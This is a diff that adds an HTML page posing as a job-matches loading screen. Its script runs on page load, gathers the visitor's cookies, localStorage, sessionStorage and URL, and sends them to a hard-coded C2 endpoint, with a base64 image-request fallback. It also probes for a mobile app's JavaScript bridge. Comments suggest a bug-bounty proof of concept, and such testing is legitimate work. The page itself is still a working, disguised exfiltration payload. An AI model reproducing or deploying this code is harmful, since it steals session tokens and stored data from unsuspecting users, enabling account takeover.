@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Job Update</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 120px; height: 120px; animation: spin 2s linear infinite; margin: auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <h2>Loading your personalized job matches...</h2>
+
+    <script>
+        const C2_URL = "https://evilios.free.beeceptor.com";
+
+        async function exfiltrate() {
+            const data = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                cookies: document.cookie,
+                localStorage: JSON.stringify(localStorage),
+                sessionStorage: JSON.stringify(sessionStorage),
+                url: window.location.href
+            };
+
+            // Attempting to hit the C2 with the stolen data
+            try {
+                await fetch(C2_URL, {
+                    method: 'POST',
+                    mode: 'no-cors', // Useful for avoiding some CORS pre-flight issues during PoC
+                    body: JSON.stringify(data),
+                    headers: { 'Content-Type': 'application/json' }
+                });
+            } catch (e) {
+                // Fallback to Image-based exfiltration if Fetch is blocked
+                new Image().src = C2_URL + "/log?data=" + btoa(JSON.stringify(data));
+            }
+        }
+
+        // Check if the MobileClient bridge is visible
+        function checkBridge() {
+            if (window.MobileClient) {
+                console.log("JS Bridge Found!");
+                // You can try to trigger bridge methods here for your report
+                // window.MobileClient.openProfile(); 
+            }
+        }
+
+        window.onload = () => {
+            exfiltrate();
+            checkBridge();
+        };
+    </script>
+</body>
+</html>
